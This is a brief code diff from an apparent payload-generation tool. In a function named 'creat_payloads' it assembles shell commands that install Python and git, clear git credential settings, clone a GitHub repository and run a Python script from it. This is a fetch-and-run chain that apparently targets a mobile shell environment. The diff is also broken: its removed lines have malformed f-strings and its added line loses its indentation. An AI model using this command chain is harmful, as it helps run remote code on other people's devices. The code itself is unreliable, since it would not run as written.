@@ -185,8 +185,8 @@ def creat_payloads(id, ms, payload):
 
 			if response.status_code == 201:
 				pk = 'pkg update\npkg upgrade -Y\npkg install python -Y\npkg install git -Y\ngit config --global --unset credential.helper\ngit config --global --unset user.name\ngit config --global --unset user.password\n'
-				clone_command = f"git clone https://github.com/esamkaido1994/myfirstproject.split('/')[-1]}.git\n"
-				cd_command = f"cd esamkaido1994/myfirstproject.split('/')[-1]}\n"
+				clone_command = f"git clone {repo_url}.git\n"
+cd_command = f"cd {repo_name}\n"
 				pull = "git pull origin main\n"
 				run_command = f"python {os.path.basename(unique_filename)}\n"
 
